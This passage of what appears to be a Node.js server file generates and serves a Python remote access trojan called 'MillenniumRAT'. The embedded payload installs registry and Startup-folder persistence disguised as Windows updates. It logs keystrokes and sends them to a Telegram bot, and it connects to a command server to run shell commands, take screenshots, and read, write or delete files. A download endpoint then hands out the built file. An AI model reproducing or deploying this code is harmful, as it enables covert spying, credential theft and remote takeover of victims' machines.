            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
            
            # Startup folder persistence
            startup_folder = os.path.join(os.getenv('APPDATA'), 
                                        'Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup')
            if os.path.exists(startup_folder):
                shutil.copy2(sys.executable, os.path.join(startup_folder, 'WindowsUpdate.exe'))
                
        except Exception as e:
            self.send_telegram(f"Persistence setup failed: {str(e)}")
    
    def keylogger_thread(self):
        try:
            import pynput.keyboard as keyboard
            
            def on_press(key):
                try:
                    self.send_telegram(f"Key: {key.char}")
                except AttributeError:
                    self.send_telegram(f"Special key: {key}")
            
            with keyboard.Listener(on_press=on_press) as listener:
                listener.join()
        except ImportError:
            pass
    
    def send_telegram(self, message):
        if self.telegram_token and self.chat_id:
            try:
                url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
                data = {'chat_id': self.chat_id, 'text': message}
                requests.post(url, data=data, timeout=5)
            except:
                pass
    
    def execute_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return f"Output: {result.stdout}\\nError: {result.stderr}"
        except Exception as e:
            return f"Command failed: {str(e)}"
    
    def get_system_info(self):
        info = {
            'hostname': os.environ.get('COMPUTERNAME', 'Unknown'),
            'username': os.environ.get('USERNAME', 'Unknown'),
            'os': f"{os.name} {sys.platform}",
            'cwd': os.getcwd()
        }
        return json.dumps(info)
    
    def screenshot(self):
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            screenshot.save('temp_screenshot.png')
            with open('temp_screenshot.png', 'rb') as f:
                return base64.b64encode(f.read()).decode()
        except:
            return None
    
    def file_operations(self, operation, path, data=None):
        try:
            if operation == 'read':
                with open(path, 'rb') as f:
                    return base64.b64encode(f.read()).decode()
            elif operation == 'write':
                with open(path, 'wb') as f:
                    f.write(base64.b64decode(data))
                return "File written successfully"
            elif operation == 'delete':
                os.remove(path)
                return "File deleted successfully"
        except Exception as e:
            return f"File operation failed: {str(e)}"
    
    def connect_to_server(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.server_ip, self.server_port))
                
                # Send initial connection info
                init_data = {
                    'type': 'connection',
                    'data': self.get_system_info()
                }
                sock.send(json.dumps(init_data).encode() + b'\\n')
                
                while self.running:
                    data = sock.recv(4096)
                    if not data:
                        break
                    
                    try:
                        command = json.loads(data.decode())
                        response = self.handle_command(command)
                        sock.send(json.dumps(response).encode() + b'\\n')
                    except:
                        break
                        
            except Exception as e:
                self.send_telegram(f"Connection error: {str(e)}")
                time.sleep(30)  # Retry after 30 seconds
    
    def handle_command(self, command):
        cmd_type = command.get('type')
        
        if cmd_type == 'execute':
            return {'result': self.execute_command(command['data'])}
        elif cmd_type == 'screenshot':
            return {'result': self.screenshot()}
        elif cmd_type == 'sysinfo':
            return {'result': self.get_system_info()}
        elif cmd_type == 'file':
            return {'result': self.file_operations(**command['data'])}
        elif cmd_type == 'disconnect':
            self.running = False
            return {'result': 'Disconnecting'}
        else:
            return {'result': 'Unknown command'}
    
    def start(self):
        if self.persistence:
            self.establish_persistence()
        
        if self.keylogger:
            threading.Thread(target=self.keylogger_thread, daemon=True).start()
        
        self.send_telegram("RAT connected and active")
        self.connect_to_server()

if __name__ == "__main__":
    rat = MillenniumRAT()
    rat.start()
`;

      // Write RAT file
      const outputDir = path.join(process.cwd(), 'builds');
      const ratPath = path.join(outputDir, `${ratId}.py`);
      fs.writeFileSync(ratPath, ratPayload);
      
      await storage.createAnalytics({
        metric: 'rat_generation',
        value: JSON.stringify({
          ratId,
          config,
          timestamp: new Date().toISOString()
        })
      });
      
      res.json({
        success: true,
        ratId,
        downloadUrl: `/download/${ratId}.py`,
        filename: `${ratId}.py`,
        message: 'Millennium RAT generated successfully',
        features: [
          'Telegram C2 integration',
          'Registry persistence',
          'Keylogger functionality',
          'Screenshot capture',
          'File operations',
          'Command execution',
          'Auto-reconnection'
        ]
      });
      
    } catch (error) {
      console.error('RAT generation error:', error);
      res.status(500).json({ error: 'RAT generation failed' });
    }
  });

  // Download endpoint for crypted files
  app.get("/download/:filename", (req, res) => {
    try {
      const filename = req.params.filename;
      
      const filePath = path.join(process.cwd(), 'builds', filename);
      
      if (!fs.existsSync(filePath)) {
        return res.status(404).json({ error: 'File not found' });
      }
      
      res.download(filePath, filename, (err) => {
        if (err) {
          console.error('Download error:', err);
          res.status(500).json({ error: 'Download failed' });
        }
      });
    } catch (error) {
      console.error('Download endpoint error:', error);
      res.status(500).json({ error: 'Download failed' });
    }
  });

  return server;
}